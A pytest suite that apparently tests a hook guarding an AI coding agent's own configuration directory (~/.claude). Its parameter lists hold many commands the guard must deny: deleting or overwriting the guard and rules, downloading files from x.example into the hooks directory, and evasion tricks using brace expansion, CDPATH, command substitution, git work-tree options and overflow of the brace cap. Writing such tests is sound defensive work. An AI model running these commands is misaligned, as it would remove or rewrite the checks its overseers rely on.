    "pushd $HOME/.claude && grep -r foo agents",
])
def test_f1_cd_without_a_protected_write_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


GIT_REWRITERS = ["checkout -- .", "checkout main", "switch main", "restore .", "reset --hard",
                 "clean -fd", "stash", "stash pop", "rm -r agents", "mv a b", "apply x.patch",
                 "am x.mbox", "merge other", "rebase main", "pull", "cherry-pick abc",
                 "revert abc", "read-tree HEAD", "checkout-index -a -f", "sparse-checkout set x",
                 "filter-branch -f HEAD"]
GIT_FORMS = ["git -C ~/.claude {s}", "git -C $HOME/.claude {s}", "git -C {c} {s}",
             'git -C "$HOME/.claude" {s}', "git -C ~ -C .claude {s}",
             "cd ~/.claude && git {s}", "cd $HOME/.claude; git {s}",
             "git --git-dir=$HOME/.claude/.git --work-tree=$HOME/.claude {s}",
             "git --git-dir ~/.claude/.git --work-tree ~/.claude {s}",
             "git --work-tree=~/.claude {s}", "git --git-dir=~/.claude/.git {s}",
             "GIT_DIR=~/.claude/.git GIT_WORK_TREE=~/.claude git {s}",
             "GIT_WORK_TREE=$HOME/.claude git {s}", "env GIT_DIR=$HOME/.claude/.git git {s}",
             "export GIT_WORK_TREE=~/.claude; git {s}", "git -C ~/.claude/agents {s}",
             "git -C $X/.claude {s}"]


@pytest.mark.parametrize("sub", GIT_REWRITERS)
def test_f4_git_in_the_config_dir_denied(shell_env, sub):
    g, cfg, proj, home = shell_env
    for form in GIT_FORMS:
        cmd = form.format(s=sub, c=cfg)
        assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "git -C ~/.claude status", "git -C ~/.claude diff", "git -C ~/.claude log --oneline",
    "git -C ~/.claude stash list", "git -C ~/.claude stash show -p", "git -C ~/.claude show HEAD",
    "cd ~/.claude && git status", "git --git-dir=$HOME/.claude/.git status",
    "GIT_DIR=~/.claude/.git git diff", "git -C ~/.claude apply --check x.patch",
    "git -C ~/.claude fetch", "git -C ~/.claude commit -m x", "git -C ~/.claude add -A",
    # a work tree elsewhere, and the project itself
    "git checkout main", "git reset --hard HEAD~1", "git clean -fd", "git stash", "git pull",
    "git -C /tmp/other checkout .", "git -C $TMPDIR/x reset --hard", "git rebase main",
    "git --git-dir=/tmp/o/.git --work-tree=/tmp/o checkout .", "GIT_DIR=/tmp/o/.git git status",
    # not "cd /tmp": where tmp_path lives under /tmp (macOS /private/tmp, as in a sandbox) that directory holds the
    # protected config dir, and the guard rightly denies a tree rewrite in a directory that contains protected paths
    "cd /tmp/other && git checkout main", "cd $HOME/projects/x && git reset --hard",
    "git -C ~/projects/repo clean -fdx", "git commit -am x", "git log",
])
def test_f4_read_only_git_and_other_work_trees_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


def test_f1_f4_end_to_end_through_the_hook(installed, tmp_path):
    g, cfg, proj = installed
    hook_path = cfg / "hooks" / "agent_guard.py"
    home = tmp_path / "home"
    home.mkdir()
    (home / ".claude").symlink_to(cfg)
    for cmd in ["rm $HOME/.claude/agents/x.md", "git -C ~/.claude reset --hard",
                "rm -rf ~/.claude/*"]:
        p = run_hook(hook_path, cmd, cwd=str(proj), HOME=str(home))
        assert p.returncode == 0, p.stderr
        out = json.loads(p.stdout)["hookSpecificOutput"]
        assert out["permissionDecision"] == "deny", cmd
    for cmd in ["rm -rf $TMPDIR/build", "rm -rf /tmp/x/*", "rm build/*"]:
        p = run_hook(hook_path, cmd, cwd=str(proj), HOME=str(home))
        assert p.returncode == 0 and p.stdout == "", (cmd, p.stdout, p.stderr)


def test_rules_protected_list_names_manifest_and_backups():
    """rules:58 names every protected entry the guard enforces (PROTECTED_CONFIG + state roots)."""
    text = (ROOT / "dot-claude" / "rules" / "claude-agent-stack.md").read_text()
    line = next(l for l in text.splitlines() if l.startswith("- Never edit the installed stack"))
    import importlib.util
    spec = importlib.util.spec_from_file_location("agent_guard_rules", str(SRC_HOOK))
    g = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(g)
    for name in g.PROTECTED_CONFIG:
        if name != ".credentials.json":           # Claude Code's login: covered by the secrets rules
            assert "`%s" % name.rstrip("*") in line, name
    for s in ("~/.local/state/claude-agent-stack", "-backups", "-cache", "install.sh"):
        assert s in line, s


R2_BRACE = [
    "cp evil.py ~/.claude/{hooks,x}/agent_guard.py", "rm -rf ~/.claude/{hooks,x}",
    "rm -rf ~/.{claude,x}/hooks", "rm -rf ~/.local/state/claude-agent-stack{,-backups}",
    "rm -rf ~/.claude/{x,{y,hooks}}", "rm -rf ~/.claude/{a..c,hooks}",
    "rm -rf ~/.claude/{h..h}ooks", "echo x > ~/.claude/{agents,x}/a.md",
    "rm -rf ~/.claude/{1..3,skills}", "touch ~/.claude/{hooks,x}/y", "cd ~/.{claude,x} && rm settings.json",
    "cd ~/.claude/{agents,x} && rm a.md",
]


@pytest.mark.parametrize("cmd", R2_BRACE)
def test_r2_brace_expansion_denied(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "rm -rf ~/x/{a,b}", "rm -rf build/{a,b}/hooks", "echo {a,b}", "rm -rf /tmp/{x,y}/bin",
    "cp a.txt /tmp/{a,b}.txt", "rm -rf ${X:-a,b}/bin", "find . -exec rm {} +",
    "rm -rf ~/.claude/{projects,todos}", "rm -rf {1..99999999}",
])
def test_r2_brace_expansion_ordinary_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


def test_r2_brace_words_helper(installed):
    g, cfg, proj = installed
    assert g.brace_words("a{b,c}d") == ["abd", "acd"]
    assert g.brace_words("{a,{b,c}}") == ["a", "b", "c"]
    assert g.brace_words("{1..3}") == ["1", "2", "3"]
    assert g.brace_words("{c..a}") == ["c", "b", "a"]
    assert g.brace_words("x{,-y}") == ["x", "x-y"]
    assert g.brace_words("{}") == ["{}"] and g.brace_words("${X:-a,b}") == ["${X:-a,b}"]
    assert len(g.brace_words("{1..100000}{a,b}")) == g.BRACE_WORD_CAP


@pytest.mark.parametrize("cmd", [
    "CDPATH=~/.claude cd agents && rm x.md", "CDPATH=~/.claude; cd agents && rm x.md",
    "export CDPATH=~/.claude; cd skills; rm -rf y", "CDPATH=/tmp:~/.claude cd hooks && rm a.py",
    "CDPATH=$HOME/.claude cd rules && echo x > a.md",
])
def test_r2_cdpath_denied(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "CDPATH=/tmp cd agents && rm x.md", "CDPATH=~/.claude cd ./agents && rm x.md",
    "CDPATH=~/.claude cd agents && ls", "CDPATH=~/other cd agents && rm x.md",
])
def test_r2_cdpath_ordinary_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


R2_WRITERS = [
    "curl -o ~/.claude/hooks/agent_guard.py https://x.example/a", "curl -fsSLo ~/.claude/hooks/a.py U",
    "curl --output ~/.claude/hooks/a.py U", "curl --output=~/.claude/hooks/a.py U",
    "curl --output-dir ~/.claude/hooks -O U", "curl -o$HOME/.claude/bin/x U",
    "wget -O ~/.claude/hooks/a.py U", "wget --output-document=~/.claude/hooks/a.py U",
    "wget -P ~/.claude/skills U", "wget --directory-prefix ~/.claude/skills U",
    "wget -qO ~/.claude/hooks/a.py U", "wget -o ~/.claude/hooks/log U",
    "sort -o ~/.claude/settings.json in.txt", "sort in.txt -o ~/.claude/rules/a.md",
    "sort --output=~/.claude/rules/a.md in.txt",
    "patch ~/.claude/hooks/agent_guard.py < x.diff", "patch -p1 -o ~/.claude/hooks/a.py < x.diff",
    "patch -d ~/.claude/hooks -p1 < x.diff", "patch -d ~/.claude/hooks agent_guard.py < x.diff",
    "patch --directory=~/.claude/skills -p0 < x.diff", "patch -r ~/.claude/hooks/rej f < x.diff",
    "cat new | sponge ~/.claude/settings.json", "sponge -a ~/.claude/rules/a.md",
    "awk '{print > \"~/.claude/hooks/a.py\"}' in", "awk '{print >> \"$HOME/.claude/settings.json\"}' in",
    "gawk 'BEGIN{print \"x\" > \"~/.claude/agents/a.md\"}'", "mawk '{print $1 > \"~/.claude/rules/r\"}' f",
    "gawk -i inplace '{sub(/a/,\"b\")}1' ~/.claude/settings.json",
    "gcc -o ~/.claude/bin/tool a.c", "pandoc -o ~/.claude/rules/a.md in.md",
    "sometool --output ~/.claude/hooks/a.py", "sometool --output-file=~/.claude/hooks/a",
    "sometool --outfile ~/.claude/hooks/a", "sometool --out ~/.claude/hooks/a",
    "sometool --output-dir ~/.claude/skills", "sometool -o ~/.claude/mcp/x.py",
    "sudo curl -o ~/.claude/hooks/a.py U", "env A=1 sort -o ~/.claude/settings.json f",
    "git clone https://x.example/r.git ~/.claude/skills/y", "git clone U ~/.claude/skills/y",
    "git init ~/.claude/skills/z", "git clone --depth 1 -b main U ~/.claude/agents/y",
    "git -C /tmp clone U ~/.claude/hooks/y", "cd ~/.claude/skills && git clone https://x.example/y.git",
    "git clone --separate-git-dir ~/.claude/hooks/g U /tmp/w",
]


@pytest.mark.parametrize("cmd", R2_WRITERS)
def test_r2_other_writers_denied(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, cmd), cmd


R2_GIT_SUBS = ["bisect start", "bisect good", "bisect reset", "bisect run make", "bisect skip",
               "submodule update --init", "submodule add https://x.example/r.git s",
               "submodule deinit -f .", "submodule foreach git pull", "merge-file a b c",
               "worktree add ~/.claude/skills/w", "worktree add -b br ~/.claude/hooks/w HEAD",
               "archive -o ~/.claude/hooks/x.tar HEAD", "archive --output=~/.claude/hooks/x.tar HEAD",
               "archive --output ~/.claude/skills/x.zip HEAD",
               "format-patch -o ~/.claude/hooks HEAD~1", "format-patch --output-directory ~/.claude/rules -1"]


@pytest.mark.parametrize("sub", R2_GIT_SUBS)
def test_r2_git_subcommands_denied(shell_env, sub):
    g, cfg, proj, home = shell_env
    if sub.split()[0] in ("worktree", "archive", "format-patch"):   # output path, not the tree
        assert denied(g, proj, "git " + sub), sub
        return
    for form in ("git -C ~/.claude {s}", "cd ~/.claude && git {s}"):
        assert denied(g, proj, form.format(s=sub)), form.format(s=sub)


def test_r2_merge_file_operand_denied(shell_env):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, "git merge-file ~/.claude/rules/a.md base other")
    assert not denied(g, proj, "git merge-file a b c")
    assert not denied(g, proj, "git -C ~/.claude merge-file -p a b c")


@pytest.mark.parametrize("cmd", [
    # generic output options and the other writers, ordinary destinations
    "gcc -o build/x a.c", "pandoc -o out.pdf in.md", "sort -o out.txt in.txt",
    "curl -o /tmp/x https://x.example/a", "curl -fsSLO https://x.example/a.tgz",
    "curl --output-dir /tmp -O U", "wget -O /tmp/a U", "wget -P /tmp U", "wget -qO- U | sh -n",
    "patch -p1 < x.diff", "patch a.py < x.diff", "patch -d build -p1 < x.diff",
    "cat x | sponge out.txt", "awk '{print > \"out.txt\"}' in", "awk '$1 > 3' in",
    "awk '{print $1}' ~/.claude/settings.json", "gawk -i inplace '{print}' notes.txt",
    "sometool --output-dir dist --out res", "cc -o ~/bin/tool a.c", "curl https://x.example/a",
    "curl -G -d q=1 https://x.example", "wget https://x.example/a", "http GET https://x.example",
    "http --download https://x.example/a", "ssh -o StrictHostKeyChecking=no h ls",
    "grep -o x ~/.claude/agents/a.md", "rg -o pat ~/.claude/agents",
    "ps -o pid,comm", "ls -o ~/.claude/agents", "git clone https://x.example/r.git", "git clone U /tmp/y",
    "git init", "git init /tmp/z", "git worktree add ../wt", "git worktree list",
    "git archive -o /tmp/x.tar HEAD", "git format-patch -o /tmp/p -1", "git format-patch -1",
    "git -C ~/.claude bisect log", "git bisect start", "git submodule update --init",
    "git submodule status", "git -C ~/.claude submodule status", "git -C ~/.claude worktree list",
    "git -C ~/.claude archive HEAD", "git -C ~/.claude format-patch -1 --stdout",
    "git -C ~/.claude merge-file -p a b c", "git checkout main", "git reset --hard",
    "git stash", "git rebase main", "git pull", "git clean -fd",
    "bash -n script.sh", "node --check a.js", "pytest tests/", "uv run pytest",
    "cargo test", "go test ./...", "cat ~/.claude/settings.json", "jq . ~/.claude/settings.json",
    "grep x ~/.claude/agents/*.md", "/usr/bin/python3 ~/.claude/hooks/agent_guard.py --self-test",
    "find ~/.claude -name x -o -name y",
])
def test_r2_ordinary_commands_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


# --- round 3: suspect expansions, the brace cap, ROOT_TEXT_RE false positives ---------------

R3_SUSPECT = [
    'rm -rf "$(cat /tmp/p)/hooks"', 'd=$(cat /tmp/p); rm -rf "$d/hooks"',
    'read -r d < /tmp/p; rm -rf "$d/hooks"',
    'for d in $(cat /tmp/p); do rm -rf "$d/hooks"; done',
    'd=$(printf "%s/.%s" ~ claude); rm -rf "$d/hooks"',
    'while read -r d; do rm -rf "$d/hooks"; done < /tmp/p',
    'mapfile -t a < /tmp/p; rm -rf "${a[0]}/hooks"', 'printf -v d "%s" "$(cat /tmp/p)"; rm -rf "$d/hooks"',
    'declare d=$(cat /tmp/p); rm -rf "$d/hooks"', 'export d=`cat /tmp/p`; rm -rf "$d/hooks"',
    'd=$(cat /tmp/p); E=$d; rm -rf "$E/hooks"', 'for d in `cat /tmp/p`; do rm -rf $d/hooks; done',
    "for d in ~/.claude x; do rm -rf $d/hooks; done", 'rm -rf "$(mktemp -d $(cat /tmp/p))/hooks"',
]


@pytest.mark.parametrize("cmd", R3_SUSPECT)
def test_r3_suspect_expansions_denied(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    'rm -rf "$VENV/bin"', 'install -m755 tool "$DESTDIR/bin/tool"', 'cp out "$PREFIX/bin/"',
    "rm -rf $(mktemp -d)/hooks", "rm -rf $(mktemp)/hooks", "rm -rf `pwd`/hooks",
    "rm -rf $(pwd)/bin", "rm -rf $(git rev-parse --show-toplevel)/hooks",
    'mkdir -p src/{a,b}', 'cp x{,.bak} /tmp/', 'for d in build dist; do rm -rf "$d/bin"; done',
    'for d in $VENVS; do rm -rf "$d/bin"; done',        # inherited variable: never suspect
    "cd /Users/example/project && for d in build dist; do rm -rf \"$d/bin\"; done",
    'D=$(mktemp -d /Users/example/project/.claude-work/t.XXXX) && '
    'install -m755 tool "$D/bin/tool"',
    'ls ~/.claude/agents | head; rm -rf "$VENV/bin"',
    'ls ~/.claude.json; for d in $DIRS; do rm -rf "$d/hooks"; done',
    'echo .claude-work; rm -rf "$VENV/hooks"', 'touch f{1..5000}.txt', 'rm -rf $HOME/.cache/x{1..2000}',
])
def test_r3_ordinary_expansions_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


def test_r3_positional_parameters_still_follow_the_command_text(shell_env):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, "bash -c 'rm -rf $1/hooks' _ ~/.claude")
    assert not denied(g, proj, "bash -c 'rm -rf $1/hooks' _ /tmp/x; echo .claude-work")
    assert not denied(g, proj, "bash -c 'rm -rf $1/hooks' _ /Users/example/project")


@pytest.mark.parametrize("cmd", [
    "rm -rf ~/{x{1..64},.claude}/hooks", "rm -rf ~/.{a{1..70},claude}/hooks",
    "cp evil ~/{x{1..64},.claude/hooks}/agent_guard.py",
    "rm -rf ~/{x{1..5000},.claude}/hooks", "rm -rf ~/{x{1..40}{a,b,c},.claude}/hooks",
    "rm -rf ~/.local/state/{x{1..2000},claude-agent-stack}",
    "cd ~/.{a{1..2000},claude} && rm settings.json",
])
def test_r3_truncated_brace_expansion_fails_closed(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    assert denied(g, proj, cmd), cmd


def test_r3_brace_expand_reports_truncation(installed):
    g, cfg, proj = installed
    assert g.BRACE_WORD_CAP >= 1024
    assert g.brace_expand("a{b,c}") == (["ab", "ac"], False)
    words, cut = g.brace_expand("{1..100000}{a,b}")
    assert cut and len(words) == g.BRACE_WORD_CAP
    assert g.brace_expand("f{1..5000}.txt")[1] is True
    # past the cap: numeric ranges collapse to one digit glob, letters and lists expand in full
    assert g.brace_expand_checked("a{b,c}") == (["ab", "ac"], False)
    assert g.brace_expand_checked("f{1..5000}.txt") == (["f" + g.BRACE_DIGITS + ".txt"], False)
    words, over = g.brace_expand_checked("~/.cla{x{1..1100},u}de/hooks")
    assert not over and "~/.claude/hooks" in words
    words, over = g.brace_expand_checked("~/.c{x{1..1100},laude}/hooks")
    assert not over and "~/.claude/hooks" in words
    assert g.brace_expand_checked("{a..z}{a..z}{a..z}")[1] is True       # 17576 words: overflow


# the brace cap never fails open (round-3 LOW): a numeric range past the cap collapses to a
# digit glob, so the protected alternative next to it is still checked; what still overflows
# is denied whatever it names
@pytest.mark.parametrize("cmd", [
    "rm -rf ~/.cla{x{1..1100},u}de/hooks",
    "rm -rf ~/.c{x{1..1100},laude}/hooks",
    "rm -rf ~/.cl{a{1..3000},a}ude/settings.json",
    "cp evil ~/.claude/hooks/agent_guard.p{y,{1..5000}}",
    "touch x/{a..z}{a..z}{a..z}",
])
def test_r4_brace_overflow_denied(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "touch out/f{1..5000}.txt", "mkdir -p build/d{1..3000}/{a,b}", "rm -f log{0001..2500}.txt",
    "cp tpl.txt dist/page{1..1500}.html", "touch {a..e}{1..900}.dat",
])
def test_r4_large_benign_brace_words_allowed(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    assert not denied(g, proj, cmd), cmd


def test_r3_root_text_regex(installed):
    g, cfg, proj = installed
    hit = ["~/.claude/x", "$CLAUDE_CONFIG_DIR/x", "${CLAUDE_CONFIG_DIR}", ".claude",
           "~/.local/state/claude-agent-stack-backups", "${XDG_STATE_HOME}/claude-agent-stack",
           "$XDG_STATE_HOME/claude-agent-stack"]
    miss = ["/Users/example/project/claude-agent-stack", ".claude-work/t", "~/.claude.json",
            "/x/claude-agent-stack/.claude-work", "my.claude"]
    for t in hit:
        assert g.ROOT_TEXT_RE.search(t), t
    for t in miss:
        assert not g.ROOT_TEXT_RE.search(t), t
